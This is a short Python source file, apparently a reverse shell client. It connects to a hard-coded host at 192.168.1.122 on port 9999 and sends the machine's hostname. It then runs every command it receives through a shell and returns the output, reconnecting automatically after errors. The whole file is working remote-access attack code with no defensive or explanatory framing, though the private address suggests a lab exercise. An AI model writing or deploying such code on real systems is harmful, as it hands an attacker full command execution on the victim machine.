import  socket
import subprocess
import os
import time
import sys
targetIp = "192.168.1.122"
port =9999
FORMAT ="utf-8"          ##############################     SARA ALZAMLY  ##############################


def socketbind():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((targetIp, port))
    client_socket.send(str.encode(socket.gethostname()))
    while True:
        try:
            data = client_socket.recv(20480)
            if data[:2].decode(FORMAT) == "cd":
                os.chdir(data[3:].decode(FORMAT))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode(FORMAT), shell=True, stdout=subprocess.PIPE,
                                       stdin=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte, FORMAT)
                currentRD = os.getcwd() + "> "
                client_socket.send(str.encode(output_str + currentRD))
                print(output_str)

        except:
         time.sleep(5)
         socketbind()